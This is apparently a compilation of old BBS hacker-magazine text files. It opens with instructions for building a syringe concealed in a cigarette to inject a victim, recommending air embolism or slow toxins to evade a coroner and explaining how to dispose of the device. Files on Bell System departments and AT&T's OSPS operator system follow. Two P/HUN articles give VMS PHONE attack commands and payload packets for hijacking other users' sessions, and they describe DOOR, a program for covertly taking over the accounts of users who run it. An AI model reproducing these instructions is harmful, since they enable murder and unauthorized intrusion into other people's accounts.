   syringe.  Now place glue around the base of the smaller syringes needle not
   much just a dab or two.  Place the larger needle over the smaller needle 
   so that it extends it out to the full 3/4's of an inch.  

3) cut the length of the syringe (the body only! not including the needle)
   down to 1 and 1/2 of an inch with a hacksaw so as to make a clean cut.

4) Now take the push stick or the handle of the syringe and cut off the tip
   of it, and cut the body down so that it is 1 and 1/2 inch's long.

5) What you should have now is a push stick that is 1 and 1/2 inchs long and
   fits just inside the syringe which is 1 and 1/2 inchs long, and a needle
   that is 3/4's of an inch long.  The whole contraption should be 3 and 
   3/4's of an inch enough to fit in a 100 cigarette easily.

Preparing the cigarette
-----------------------

1) Remove the filter from the cigarette by twisting it off, and then throw the
   long part of the cigarette away.  The paper should extend about 1/4 of an 
   inch from the filter, and try not to rip it.  The paper normally extends 
   a little bit naturally.

2) Take your tweesers and pick out the filter from the inside of the cigarette
   leaving a little bit about 1/4 inch of the filter to cover the end of the 
   cigarette.

3) Now take another cigarette and tear off the long part, and empty out the 
   tobacco saving it for later. 

4) Now you should have an empty hollow cigarette shell.  A bored out filter
   with 1/4 of an inch of the ending left on.

5) Now glue the long hollow part of the cigarette back to the filter and let
   it dry.

Arming the Contraption
----------------------

1) Now place the toxin into the body of the syringe with the needle on it of
   course.

2) Place the pushstick over it extended.

3) Place the setup into the cigarette with the back of the push stick touching
   the filter.  

4) Fill the remaining space of the cigarette with the leftover tobacco.

How to Use
----------

1) Light the cigarette since the needle end will be filled with a good portion
   roughly 1 minute 15 seconds of burning tobacco. 

2) Walk by the victim and burn him/inject him by pushing down on the filter of
   the armed cigarette.

3) The victim will think it was just a cigarette burn call you an idiot and 
   walk away.

Notes
-----

1) You might have to experiment with the lengths to get it just right.

2) Only use 1 cc or less of toxin or the victim might notice that something
   funny is going on before he dies.

3) Test it before you use it.  Cigarettes are a dime a dozen.

4) Never throw it away near the site.

5) Destroy it after it's use since plastic melts this is easy then throw it
   in a gutter or a junkyard.

6) Be careful not to scrape yourself.

7) The burn will take care of the pain, so he/she shouldn't notice a thing.

8) There will most likely be an inquest especially when normal people just drop
   dead and die.

9) Try to use slow acting 15-30 minute toxins that are lethal in small doses.

Toxins for Use
--------------

1) The Simplest toxin to use is air.  An air bubble in the brain causes death  
 and there is no way in hell a coroner can detect foul play unless he is   
looking for it.  Not to mention there will be a burn blister over the 
   injection hole, so it will not be noticed.

2) Be creative think of something.

Conclusion
----------

        In conclusion I would like to add that there are many toxins for you
use.  There are hundreds of other viable options out there just waiting to be
discovered.

      All research gathered, tested and mastered by the original 
      members of SSWC:  
 
      Chance - The Technician - Cellular Phantom 
 
       
      This text will give you an in depth look at some unexplored 
      operating departments located in the Bell System. As well 
      as newly discovered equipment and electronic devices used 
      by Bell Technicians. Note that information in this file is 
      subject to change. However, we will try to keep you updated 
      as much as possible. 
 
      There are many different types of acronyms used in this text. 
      You will find a list these acronyms at the end of this file. 
 
 
 
   We will begin the file by discussing a mechanical/electronic 
device used by the Cable Transfer Administration (CTA) known as 
a Transfer Switch. This device is specifically used to verify a 
working line on both the "from" cable pair and the "to" cable 
pair through the backtap, and is transparent to the customer (in 
other words the device is unnoticeable to the customer).      
Although the Transfer Switch itself is located at the CO, CTA 
is responsible for the maintenance and upkeep of the Transfer 
Switch.  
 
   Next we will discuss a department of Bell known as the 
Distribution Service Design Center (DSDC). The Cable Transfer 
Representative (this person is a clerk for DSDC), will prepare 
the Cable Transfer Schedule and assist the other representatives 
in coordinating telephone line repair and completion dates. 
The engineering job schedule, service requirement dates, pending 
or potential held orders, age of job, etc, will determine the 
priority of each scheduled completion date. It is the  
responsibility of DSDC Transfer Representatives and Committees 
to provide a splicing sequence and resultant fill on an 
Engineering Work Order (EWO). The DSDC will determine the number 
of "Plain Old Telephone Service" (POTS) circuits and special 
and designed services on the EWO. They will help determine if 
the rearrangements and changes incorporated in the EWO will 
necessitate a design review by the Circuit Provision Center (CPC). 
The DSDC will forward to the CPC old and new line makeups for 
designed service. The DSDC scheduling engineer is responsible 
for reviewing old and new EWOs involving cable, line, or station 
rearrangements and for establishing the time needed for job completion. After reviewing old work orders, the DSDC shall 
do one of the following: 
 
 
 
1. Reschedule the cable, line, or station transfers. 
 
2. Initiate a revision of the transfer so it will be compatible 
   with existing conditions. 
 
3. Issue a cancellation of the particular transfer in question. 
 
   The Circuit Provision Center (CPC) involves cable, line, or 
station transfer procedures when it is presented a notification 
of a cable transfer and an indication that special services are 
involved. The CPC will receive notification from the DSDC that  
a circuit change will be required. The notification document  
will provide the CPC with: 
 
A. Project number and expected record issue date (RID) and  
   due date 
 
B. Common language circuit identification (CLCI) 
 
C. Old assignment and makeup  
 
D. New assignment and makeup.  
 
   It is the responsibility for The Frame Control Center (FCC) 
and affiliated representatives to contact each CO involved in a 
cable transfer and will be a member of the Cable Transfer 
Committee (CTC), and will attend committee meetings. The CTC 
will also make frame cross-connect activity completion 
commitments. Placing and removing front-tap connectors, sending 
tone, and connecting automatic taggers and Central Work Group  
(CWG) talk pairs shall be the responsibility of the FCC. 
 
   Upon receiving of either the Exchange Customer Cable Record 
(ECCR), Computer Systems for Mainframe Operations (COSMOS) 
printouts, or local forms from the Loop Assignment Center (LAC), 
the Central Office Work Group (COWG) shall make a verification 
and test of the transferring cable counts and resolve all 
record problems with the LAC. The COWG will use the following 
procedures for verification and test: 
 
1. Verify the telephone number on all working pairs in both 
   the "from" and "to" counts and check for any vacant pairs not 
   listed. 
 
2. Test all vacant pairs in the "to" count, using the Go/No-Go  
   test set or equivalent. 
 
3. Any discrepancy found as determined in (1) or (2) shall be 
   posted and the forms returned to the LAC on or before the  
   scheduled completion date for verification and pretest as 
   shown on the transfer schedule. 
 
 
 
   Note: Verification and pretests are extremely important in 
         preventing future service interruptions, unresolved 
         discrepancies, and cost delays. (In other words this 
         is done so Bell won't loose a dime of their precious 
         "millions". 
 
   After placing the backtaps, the COWG must validate that the 
backtaps are correct and any work or record problems found, will 
be corrected by the COWG and forwarded to the LAC for updating 
records. In work locations where COSMOS is fully used, the  
transfer MUST be stated in COSMOS, when backtaps are placed or 
removed, by using the appropriate work code found in the COSMOS 
Frame Training Manual. 
 
 
 
 
   
      *   Note to the reader: All Bell departments discussed in 
            in this text work together on a regular basis, 
            generally when their is a problem with a cable  
            transfer or with similar related equipment, the 
            Bell departments will interact with each other in 
            order to remedy the problem.

=================================================

       All research gathered, tested and mastered by the original 
       members of SSWC: 
 
       Chance - The Technician - Cellular Phantom 
 
 
       SSWC presents our latest text file continuing our discussion 
       on Bell Operating Departments. Note that information in  
       this file is subject to change. However, we will try to keep 
       you updated as much as possible.  
 
 
     We will begin by discussing an important department of Bell,  
  known as the Maintenance Center (MC) or Special Service Center 
  (SSC). The MC is responsible for verifying and coordinating the 
  transfer of special service activities between the Construction 
  Work Group (CWG) and the Central Office Work Group (COWG). The  
  MC or SSC will maintain control of all special service transfers. 
 
       Note: When using an approved transfer switch, testing of 
             Plain Old Telephone Service (POTS) services  will be 
             performed by the CWG. The MC meed only test services 
             classified as type "B". (This type of classification 
             is generally used on the Computer System for Mainframe 
             Operation (COSMOS) mainframe). 
 
    The MC will receive a copy of the cable transfer and associated 
  work orders from the Loop Assignment Center (LAC) prior to the 
  scheduled start date of the transfer. They will deal with any  
  unrecognized problems (such as clearing defective pairs, if  
  requested by the Distribution Service Design Center (DSDC), and 
  giving notification of what pairs have been or cannot be cleared) 
  that would require new pair count assignments.    
      
     The MC shall arrange with the CWG, Frame Control Center (FCC), 
  SSC, and other necessary departments for the transfer of special 
  and designed services that require release or special handling. 
  During the transfer of these services, the MC will maintain  
  communication with all personnel involved in the transfer  
  activity. 
    
     The MC or SSC shall coordinate the release and transfer of 
  special and designed services designated as "B" services. The time 
  and date for each service release shall be recorded on the MC copy 
  of the Special Service Protection List and Defective Pair List. 
 
       Note: Time and date of release must be negotiated in advance 
             of the cable transfer. No work shall be permitted on 
             service requiring a release until a method of procedure, 
             including release date and time and personnel required, 
             has been established by the MC and approved by the  
 
             customer and SSC control office responsible for those 
             services. When the MC receives work of those specific 
             or out-of-the-ordinary release requirements, the  
             Construction Management Center (CMC) supervisor, FCC 
             supervisor, and other necessary work group supervisors 
             must be notified in advance so they can begin work on 
             the transfer.  
      
     The MC shall test all affected special and designed services 
  completed by the CWG as the transfer progresses. The CWG need not 
  wait for verification by the MC, unless problems are encountered. 
  The CWG will inform the MC of progress. The MC shall have the 
  authority to stop the transfer procedures at any time if extensive 
  trouble reports develope. If this occurs, the MC supervisor will 
  lead an investigating committee to determine the cause of trouble 
  and to recommend corrective action.  
 
     After all work is completed, the MC will issue a final closing 
  number for the completed transfer. The MC will notify the FCC that 
  the transfer is complete and will give them the closing number. 
  The MC will post the Cable Transfer Form as complete and will  
  forward the transfer, including changes, and Defective Pair List 
  to the LAC.   
 
 
     We will now discuss the uses of the Cable Transfer Administration 
  (CTA), and how they operate at a successful level.  
 
     The general functions and responsibilities of the CTA work group 
  is to provide flexibility in the design of the cable network,  
  existing cable pairs are transferred for one cable count to another 
  cable count. This is commonly referred to as a cable transfer or  
  cable throw. The transfer occurs in a splice and involves  
  disconnecting pairs of wires beyond the splice from one feeder 
  cable count and reconnecting then to a different feeder count. 
  The result is that the count of the pairs beyond the splice will 
  change. The configuration, identification, and possible transferring 
  of working cable pairs are complex and time-consuming. The work 
  is further complicated by the many functions required of other  
  work groups. To ensure that these operations are performed free of 
  service interruptions and with maximum efficiency, timing and close 
  coordination among all the work groups involved are mandatory. 
 
     The same coordination is required to complete drop wire re- 
  connections (line transfers). The Cable Transfer Committee (CTC) 
  is also responsible for organizing this work in a timely manner. 
  As soon as practical, after the line transfer have been completed, 
  the old cable should be cut off and removed. (Their is more 
  hardware work involved in this process, however we regret that 
  we have not yet been able to fully research and understand what 
  further hardware applications are used).  
 
 
 
    
      In order for the Cable Transfer Committee to obtain a high  
  degree of transfer efficiency, all committee members must attend 
  committee meetings on a selective basis and monitor the published 
  minutes (in other words review information from past meetings). 
  Higher management will be able to evaluate the effectiveness of  
  the transfer committee. The number of jobs completed as scheduled 
  and the ability of the committee to identify problems should be  
  monitored as a measure of committee success in scheduling and 
  completing cable transfers. 
   
     The use of these procedures will reduce customer trouble reports 
  and the overall cost of cable and line transfers and will permit 
  balancing the work force and work load for all groups involved. 
  By completing cable transfers promptly, in accordance with the 
  time schedule, changes to transfer sheets will be minimized, the 
  need for rerunning cables will be reduced, testing cables can be 
  properly scheduled, and time spent on field work can be shortened. 
  The errors, frustrations, and probability of cable troubles  
  associated with delays in this kind of work can be virtually  
  eliminated. 
      
     A Cable Transfer Committee must be established in each network 
  distribution service/construction district to ensure close  
  coordination and proper timing of cable, line, or station transfers. 
  Districts that cover a large service area (having more that one 
  Loop Assignment Center or Maintenance Center) may require more 
  than one committee. 
 
 
     When scheduling transfers, consideration must be given to work 
  tours and peak load periods (busy times of the week) of all work 
  groups to optimize the continuity of the cable transfer activity. 
  Consideration must also be given to time required by the CWG 
  to complete preliminary work, by the LAC to analyze and lay out 
  the transfer, by the Circuit Provision Center (CPC) to check the 
  design of special services, by DSDC, Construction Management 
  Center (CMC), and installation to make the resulting changes, and 
  by the MC and/or SSC to negotiate with special service customers. 
  The Cable Transfer Committee must negotiate all completion dates. 
  The transfer committee chairperson will monitor and take action 
  on excessive time intervals for all work groups. Transfers that 
  involve an extremely large number of working circuits may require 
  scheduling in smaller segments. Transfers should be scheduled to 
  maintain continuity until wire work is completed. The committee 
  is responsible for all special scheduling. Offices with  
  mechanized assignment records such as COSMOS or TIRKS require 
  more strict scheduling due to transaction restrictions. 
  Sequence transfers and the reusing of counts cleared on previous 
  transfers may also require more strict scheduling. Cable  
  transfers worked via COSMOS must be closely monitored to avoid 
  long-term storage of cable transfers in the data base. 
  Long-term storage causes changes for the FCC and CWG, thereby 
   
  causing lost time. The committee will make preliminary arrange- 
  ments for the transfer of special and designed services. The LAC 
  will provide a list of all special services, by Common Language 
  Circuit Identification (CLCI), that are in the affected cable  
  count to the DSDC prior to scheduling the transfer in the firm 
  period. The DSDC will forward the list to the CPC along with the 
  new and old cable makeup for the reissuance of new Work Order 
  Record Detail (WORD - The work authorization and layout card 
  for designed special services) documents and redesigns, if 
  necessary. 
 
     After the new WORD documents are received, the FCC will bring 
  the Work Authorization (WA - The first page of the WORD document) 
  to the CTA committee meetings. The WA copy will contain the work 
  description and associated notes for the transfer and, most 
  important, will give the circuit classification code "A" or "B". 
   
 
 
     Next we will discuss information concerning the Telephone  
  Outside Plant. This brief discussion will inform you exactly what 
  path cables take from the CO to the subscribers residence.  
  This path is as follows: 
 
 
      1  Main Distributing Frame (MDF) 
      2  Tip Cables 
      3  Cable Vault 
      4  CO Manhole 
      5  Main Conduit  
      6  Subsidiary Conduit  
      7  Insulated Joint 
      8  Main Distributing Terminal (MDT) 
      9  Riser Cable 
     10  Distributing Terminal  
     11  Anchor Guy 
     12  Aerial Cable Cross Connecting Box 
     13  Telephone Company Owned Pole 
     14  Aerial Cable 
     15  Strand (one cable) 
     16  Joint Use Pole Electric or Telephone 
     17  Terminal  
     18  Splice 
     19  Electric Wires 
     20  Urban Wires 
     21  Dropwire 
     22  Main U.G. Cable 
     23  Stub 
     24  Rear Wall Cable 
     25  Buried Cable 
     26  Cribbing  
     27  Block Pole 
 
 
     After completing this sequence the cables will then run into 
  the residence, providing telephone service.

                 Baliord's Stupid VMS Tricks Vol 1: PHONE
                 ----------------------------------------  
                               By Baliord

                  Phile #6 of P/HUN Magazine Issue #5

 
    This program is the culmination of about a month's research, debugging,
and coding.  Any bugs in it are my fault, but I am not liable for them since
I am not running it (or compiling it) on your system.  You accept all
responsibility for the execution of this program by compiling it.  This
program is meant to show what CAN be done with the VAX/VMS PHONE program,
and is a working program solely for the purpose of showing that it CAN be
done.
    Sometime in 1986 or 1987, a friend of mine quit a job working with a
record company.  In the process of leaving, he managed to pick up a copy
of the VAX/VMS 4.0 source code on microfiche.  Since then, he has gotten
2 more editions.  He unfortunately doesn't understand the code, but just
likes to have it around as proof of his "abilities."  Once he acquired a
second copy of the code, I requested his earlier edition.  He gave it to
me freely.
    In the middle of 1988, a "user" at my local college approached me and
said that his PHONE conversations were being tapped.  I laughed, and told
them that it was impossible.  They persisted, and thus I foraged into the
realm of VMS PHONE discovery.   Upon reading the source code for PHONE, I
discovered that it was the funniest, and most interestingly written  (and
commented) program in the deck.  I discovered that, 1) PHONE was designed
with a RECORD feature that would allow users to record conversations (and
inform the other  party that a recording was occurring),  and that 2) the
mailboxes created by the phone  program were completely world accessible,
as well as being  easily discovered;  and that 3) for some reason DEC had
commented out ONE LINE from PHONE,  making it unable to RECORD, but still
including the code to do so in the program.
     The other thing that was in the PHONE source was a list of the control
codes that would force the program to do various things.  Surprisingly, the
commands typed at the keyboard were treated the same as characters recieved
through the mailboxes.   Needless to say, I immediately started considering
ways to access them.   After a bit of debugging,  hacking, and causing some
horrible errors to appear on other people's terminals, the program here was
written.
     The first program is the actual PASCAL source code for the message
sender; the next program is the  .CLD file you should create to use the
program;  the next thing is a list of the format and the method used in
creating your own file to send.  The last file is a few sample files to
be created to demonstrate the things that can be done.
     An interesting point is that the CALLING user creates the mailbox
FOR the called user.  This means that an answering machine program can
be written that will recieve messages, and hang up without needing the
user to watch over it.  Of course the user must be logged in, but they
need not recieve phone calls to get their messages!   I have written a
program to do this, and it may be published in the future.
     Oh yes, the method for finding out what users are currently using
the phone system is to:
                       SHOW LOG PHN$*/SYS
This works because PHONE creates systemwide logical names formatted as
PHN$<username>.
     The following is the method for using the PHZAP program...  Lines that
begin with ';' are comments...
 
$ SET COMMAND PHZAP
;  This enables the command...
$ SHOW LOG PHN$*
   "PHN$GOD" = "_MBAxxx"
   "PHN$DEVIL" = "_MBAxxx"
;  As I just said, that lists out who's using the system...
 
$ ZAP GOD/TYPE=MSG/MESSAGE="Personally?  I think you goofed off for six days"
$ ZAP GOD/TYPE=MSG/MESSAGE=" then pulled an all-nighter!~"
;  Drops up the message on His screen.
 
$ ZAP DEVIL/TYPE=MSG/MESSAGE="\And I said, Let There Be Light!  And YOU got"
$ ZAP DEVIL/TYPE=MSG/MESSAGE="hung up!"
$ ZAP DEVIL/TYPE=CMD/MESSAGE="HANGUP"
;  Places the message on It's screen, then forces It to HANGUP.
 
$ ZAP GOD/TYPE=CMD/MESSAGE="HELP SWITCH_HOOK"
;  This command teaches Him a bit about Switch Hooks, by forcing Him into
;  help...

capital letters are smotheringly sarcastic...  You're smarter than you
look!

-----------------------------------------------------------------------------
    The format for a simple file is <cmd-char>NODE::USERNAME<CHR(0)><msg-char>
 
    You can force a message to a person's screen by one of two methods,
the first is using the above format and writing your message in the <msg-char>
section of the packet using <listen>.  This requires writing it character by
character.  The other option is to send the KBD_ROUTE command along with the
message in normal text (with a <CHR(0)> at the end of course.)
    The CMD_PARSE command allows you to force a command on the user, through
their PHONE program.  It only works for commands within PHONE, however, so
you cannot make them log out or such, only kick them out of phone.
    The ANSWERED flag is useful in writing an answering machine, in that you
send <answered>NODE::<answering user><CHR(0)> and the calling PHONE program
will pop up the second screen as if the person had answered.  BUSY is also
a nice one to be able to send (as well as rejected!)
    If you send a <hangup>NODE::<hanging user><CHR(0)> ONLY THE USER YOU HIT
with PHZAP will see that user as hung-up!  The other user (who supposedly
hung up) will still see the other user listed on their screen!  (Nothing
typed will reach them of course, but it is an interesting mindfuck!)
    The <facsimile><msg-text><CHR(0)> is (if I remember correctly) the proper
method for FAXing something over the VAX PHONE.
    The <held>NODE::<holding user><CHR(0)> command puts the user you hit on
HOLD in that user's eyes, but not to the "holding user."
    Sending a <forced-link>NODE::<user #1><CHR(0)>NODE::<user #2><CHR(0)> will
pretend to create a link between the user you are ZAPping and user #2.  Both
users **MUST** be logged in, but not necessarily in PHONE!  Thus you can force
a link between a user and <login> just to freak them out!  An example of this
is given below.
    The codes I haven't discussed are either too weird/complex to handle
easily, or I just don't know how to use them.  (or have never bothered.)
 
kbd_get      = chr (1);
kbd_route    = chr (2);
cmd_parse    = chr (3);
talk         = chr (4);
help2        = chr (5);
ring_out     = chr (6);
slave_verify = chr (7);
rang_in      = chr (8);
hangup       = chr (9);
busy         = chr (10);
answered     = chr (11);
rejected     = chr (12);
slave_done   = chr (13);
listen       = chr (14);
directory2   = chr (15);
facsimile2   = chr (16);
forced_link  = chr (17);
held         = chr (18);
unheld       = chr (19);
 
----------------------------------------------------------------------------
Some sample .PHN files follow...  <nn> is used to refer to <CHR(nn)>...
 
FOFF.PHN
<04>Lemme ALONE dammit!!<00>
 
    This drops a message in the users OWN message area as if he had typed it
to send to somebody.  They don't even have to be connected to somebody for
you to do this.  It's most useful when someone is calling you and you want
to tell them to call back later.
 
FYOU.PHN
<14>HEAVEN::GOD<00>F
<14>HEAVEN::GOD<00>u
<14>HEAVEN::GOD<00>c
<14>HEAVEN::GOD<00>k
<14>HEAVEN::GOD<00>
<14>HEAVEN::GOD<00>Y
<14>HEAVEN::GOD<00>o
<14>HEAVEN::GOD<00>u
<14>HEAVEN::GOD<00>!
 
    This sends a message to a user in the standard way, as if someone had
typed it.  This is also the method that is in the mailboxes used by PHONE,
so if you want to write an answering machine, you have to parse that pattern.
 
ACCVIO.PHN
<15>HEAVEN::GOD<00>
 
    That causes Acess Violation errors to flow down the users screen.  Don't
ask me why; I don't know.  Does it under V4.6 of VMS, others I'm not sure.
 
LINKUP.PHN
<16>HEAVEN::DEVIL<00>HEAVEN::GOD<00>
 
    After send that to a user's mailbox, their screen should flash with the
"DEVIL has created a conference call with GOD" message.  Both users MUST exist
and be logged on currently.  If you want to add yourself into a conversation
go into phone, have someone "link" you with their conversation and then have
someone link them with you...  It must be done to both.  Of course you could
always use this...
 
ANSWER.PHN
<03>ANSWER<0>
 
    That will force an ANSWER command from the keyboard into the COMMAND
buffer.  If you have a friend do that to them, as you are phoning them, then
they will be connected without the chance of them rejecting!  <Then you have
your friend start linking all the phone conversations on the system by one
person each!>
 
     I think that's enough examples for you to be able to figure out the
format for the rest yourself.
 
     If you have questions about this, or any other program you have seen
my name on, or you have VAX specific questions, I am available on The Toll
Center BBS @ (718) 358-9209 and the Rogue's Gallery BBS @ (516) 361-9846.

                Baliord's VMS Tricks Vol 2: DOOR
                --------------------------------       
                          By  Baliord


                  Phile #7 of P/HUN Magazine Issue #5

    The following program was designed to be an example of the use of
VAX/VMS Mailboxes for multi-process control.  Any use of the program
is the responsibility of the person compiling and/or running the
program.
 
    In this file, we look at the use of VMS's Mailbox facilities.  The VMS
Mailbox was designed as a way of assisting interprocess communication for
non-priviledged users.  An example of a program that uses the MBX facility
is PHONE.  PHONE uses the mailboxes, along with system-wide logical names, to
allow users to send information packets back and forth.
    In the last file I discussed how to take advantage of PHONE's "open"
logical names for confusing users.  In this installation, you will see how
MBX's are VERY useful in taking over people's accounts.
    This program is called DOOR (a name given it by CW, a very helpful friend
who doesn't have a handle), and it allows the "default_control" user to control
the account of any person who runs this program.
    The code does the following:
 
1)  The control_user string is set to the user who will recieve the MAIL that
this user is now "accessible."
 
2)  The MBX's necessary are created, using the INDOOR and OUTDOOR logical
names as storage area for the MBAxxx: strings.  (If the person already has
INDOOR and OUTDOOR defined in their main process, then the program will NOT
work.)
 
3)  The program waits 1 second, to assure that the MBX's have time to become
registered with the system.
 
4)  INDOOR and OUTDOOR are converted back from logical names to the actual
device names so the control_user can be told what they are.
 
5)  The process is spawned off with the first command being to tell the
control_user what the MBX numbers are.
 
6)  The program then ends.  (At this position, an interesting thing to put
might be a chain to whatever program name you call it with the version number
as -1.  I.E.  DOOR.EXE;-1 would be the program you chain to.  Then the program
would, in effect, create the process, then execute a real program.)
 
     The control_user must then read their mail and create two MBX's that
correspond to the information given in the mail.
I.E.
    OUTDOOR=_MBA211: INDOOR=_MBA212:
would be ASSIGNED at the DCL level as ASSIGN MBA211: OUTDOOR and
                                      ASSIGN MBA212: INDOOR
This must be done before the next two programs can be run.
 
     The next two programs are, in order, the SEND program and the program to
GET the information.
 
     The SEND program assumes that you have entered a
SEND:==$[directory]SEND.EXE
                           command.  It takes whatever you typed after the
SEND command and sends it through to the INDOOR mailbox.  The directory in
the definition above is the directory you are keeping the SEND program in.
 
     The GET program is the next program, and can be run directly.  Or you
can create a
GET:==$[directory]GET.EXE
                         command.
 
     The process for operation is illustrated here.

A new operator services system for the 5ESS switch gives phone companies and
worldwide phone service administrators unparalleled flexibility in deploying
operators.  The system is called the Operator Services Position System (OSPS),
and it's operation is based on the Intergrated Services Digital Network (ISDN)
capabilities of the 5ESS switch.  These capabilities permit simultaneous data
and voice communications between the switch and the operator's terminal
equipment.
     OSPS allows the phone service providers to provide full-featured North
American and international operator service with operators located a distance
from the switching system.

AT&T has added a new feature--the Operator Services Position System--to its
5ESS switch.  A major difference between OSPS and the previous operator
system--the Traffic Service Position System  (TSPS)--is OSPS's ability to
provide several applications simultaneously on one switching system.  One
Switch with OSPS can serve up to 128 teams of operators handling different
applications, such as directory, toll, and operator assistance.
     The OSPS can be deployed as a stand-alone system or integrated with a
local, toll or gateway 5ESS switch.  For directory assistance, a basic services
terminal and a Directory Assistance System/Computer provide the directory
listing.  A video display terminal helps with charging and completing toll and
assistance calls.  In some applications, the OSPS supplies data from external
computer systems at the operator terminal.  The OSPS can also offer fully
automated services such as Automated Calling Card or Automated Coin Services. 
It does this by linking to network data bases to validate credit or calling
card numbers, and to determine the charging rates.
      For international applications, OSPS provides the international features
used in local, transit, and gateway applications,  For these applications, the
system makes available services such as call booking(thats when you say that
you want to make a call to Russia and the operator say "I'll call you in 5
hours so you can place the call, ok?"), and it can handle various types of
international trunking and signaling.

DESIGN OBJECTIVES

     Besides providing state-of-the-art operator services, OSPS also improves a
phone company's financial results by reducing operator, administrative, and
maintenance costs, improving network design efficiency, and creating new
revenue opportunities.

Operator Expense     
     Reducing the average amount of time operators take to handle a call can
cut expenses by millions of dollars.  A major effort, therefore, was devoted to
achieving this.  Attention to human-machine interfaces led to operator
positions that reduce the motions and concentration needed for each function. 
For toll and assistance, for example, the video display terminal improves the
position of information on the monitor screen and the grouping of action keys. 
The display terminal also has single keys that are set up to perform complete
functions.  This results in faster action and reduces operator stress.(I hope
this will help them get a better atitude) 
     To speed things up, the OSPS automates operator tasks associated with call
handling.  Paper records and information bulletins are eliminate by 
computerized ticketing and an automated multileaf bulletin.  Since a
significant portion of operator work time is normally spent in determining if a
line is busy and waiting for answer, this portion of the call can be automated.
Future releases of the system will allow operators to handle other calls during
these periods.

Administrative and Maintenance Expense
     Since OSPS is a feature of the 5ESS switch, administrative and maintenance
expense is reduced by making common use of the base 5ESS switch capabilities
and by using a common maintenance force.  The operator service center, where
the operators are, may be located away from the host 5ESS switch.  Additional
equipment, therefore, is provided to support administrative printers and
terminals, and the management of the operators.
     Such support comes from the OSPS administrative processor (OAP), an AT&T
3B2 computer.  Expense is minimized by allowing one administrative processor to
support as many operator services centers as the phone company desires; not too
many of these are need. Only one OAP is needed for every switch.  Most
commercial automatic call distributor applications use some type of manegement
information system (MIS) to provide similar administrative control and
reporting as does the OAP ofr OSPS.  Overall, administrative expense is reduced
by allowing several teams of operators and several types of calls to be
administered together.

Network Design Efficiency
     The 5ESS switch with remote integrated services line units allow operator
service centers to be hundreds of miles from the host switch.  OSPS can be
added to a 5ESS switch dedicated to operator services with any combinationn of
different applications, or integrated into a network switch serving other
gateway, toll, tandem, or local traffic.  If initial operator needs are small,
a single switch could serve just a few operator positions. (Because of the
modular design of the switch, the number of operator on one switch could grow
one by one until they got over 100. There could be as many as 128 teams of
operators handling a total of nearly 100,000 calls an hour.
     One OSPS can handle call processing and a second OSPS can handle operator
assistance.  This can be a permanent arrangement to minimize new operator
trunks and/or the number of sites staffed with operators.  It is also possible
to reconfigure operator teams.  Entire OSPS systems or selected teams can be
closed down during periods of low traffic.  Calls are then directed to other
teams or another OSPS in the network.  Because of these capabilities, the
network can be redesigned continuously to meet changing needs.

More Service Opportunities
     The OSPS is based on ISDN capabilities and open interfaces that support
customization, customer independence, and flexiblilty.  ISDN supplies
packet-switched access to data bases, as well as interfaces to operator
terminals and support systems.  The open interfaces make it easy to add new
services and to support multiple interchange and local exchange carriers.  Data
can be sent to the operator terminal from computer systems external to the
switch, allowing an operator to talk with a caller while receiving data from a
remote data base.  Both the data base information and the telephone information
can be displayed using the windowing capabilities of OSPS video display
terminals.

SYSTEM ARCHITECTURE

     The OSPS was designed and built on the existing ISDN architecture of the
5ESS switch.  The switch consists of three major hardware modules, handling
administration, communications, and switching.  There are two types of
switching modules, one for normal voice calls, and another, an ISDN module, for
voice and data.  The ISDN switching module is the interface between operators
and the switch.
     The administrative module provides system administration functions,and
supports automatic calll distribution to operators for each OSPS application. 
Hardware and software are added to the basic switch to perform automated and
manual operator functions.  Different types of operator terminals are furnished
for different OSPS applications.  An OSPS administrative processor is available
to support each particular application.  The terminals allow operator to
receive and control calls, and to send and receive data through the switch. 
Functionally, these are ISDN terminals with simultaneous voice and data
communications capability.
      The terminals are connected by digital subscriber lines to the switch's
integrated services line unit (ISLU) or to a remote ISLU (RISLU) when the
operator services center is a distance from the host switch.  The ISLU or RISLU
acts as an operator position controller.  Operator terminals may be located
several miles from the position controller, with the exact distance dependent
on the application and type of interface.  Where the RISLU and multiplexed onto
digital facilities that connect to the host 5ESS switch.

Systems Interfaces and External Data Bases
     For directory assistance, the 5ESS switch communicates with a
vendorsupplied Directory Assistance System Computer (DAS/C).  In response to
customer requests, the operator consults the system for directory listings. 
Like the basic services terminal with which it works, the DAS/C can be
connected to a RISLU and share the remoting capabilities with the basic
services terminal or it can be connected directly to the ISLU.
     The OSPS administrative proccessor is used for directory assistance as
well as toll and assistance operation.  This processor is located in the
operator services center and/or force management center.  It is used with
administrative terminals and printers to support administration and managemnet
personnel by providing traffic, performance, and operator team data when
requested.
     The OSPS connects to other vendor or phone company data bases as well as
to other 5ESS switches.  The connections to other switches make available
remote capability for complete call handling.  The phone company may choose to
use these connections as paths between switches to provide call processing at
the originating switch and operator services at another switch.
     The switch's common channel signalinng interface accesses a number of
external data bases.  Network signaling interfaces unique to the international
application are available to provide new features.  These interfaces vary from
country to country.

SYSTEM OPERATION

     The heart of the OSPS is a full-featured, flexibly administered automatic
call distributor (ACD).  A call coming into an OSPS is selected for a
particular operator team based on its incoming trunk and the dialed digits. 
The originating switching module determines the call type and gives the ACD the
information needed to select the proper operator team.  If operators are
available, the call is routed to one on the team who has been sitting one her
ass the longest.  If an operator isn't available in that serving team, the ACD
holds that call and the customer is sent a response (a ring, announcement,
silence, music, etc.).  When an operator becomes available, the customer that
has been on hold the longest is routed to the operator who hasnt had a call the
longest.
     For directory assistance, the operator asks for number-identifying
information and then taps into the database.  The number is given to the
customer by a recorded announcement or the operator.
     For toll and assistance requests, the operator asks for charging
information and the system handles charge recording and the call completion. 
Alternate billing is verified and coins collected where appropriate.  Domestic
and international system function similarly, but with different country
specific features.
     The OSPS automated features include Automated Calling Card and Automated
Coin Toll Services.  The automatic charge recording feature for certain calls
includes automated announcements, coin-tone detection, and multifrequency tone
(from touchtone sets,DTMF) detection.  The system can tell if collect calls or
third-party calls are being charged to a uncollectable number(like payphones,
non-working numbers, phones with unpaid bills,etc) and informs the operator on
this.

OPERATOR TERMINALS

     There are three types of operator/agent terminals to match applications
and customer needs.  All are designed to increase operator comfort and
performance, reduce training time, and improve flexibility and control.

Video Display Terminal
     The video display terminal (VDT) is for toll and assistance applications. 
The VDT's digital voice capability achieves silence between calls and clear
voice transmission.  The voice features include automatic volume control,
toll-quality voice path, multiple alerting tone capabilities, and voice-path
fraud prevention.  Operators and office administrators have the option of using
mute and split capabilities, which isolate the parties' voice paths at
appropriate times during a call to eliminate talk-over. (Talk-over is a brief
message between the caller and the called person while they shouldnt be
talking.  For example, if collect charges will be accepted be the called party.
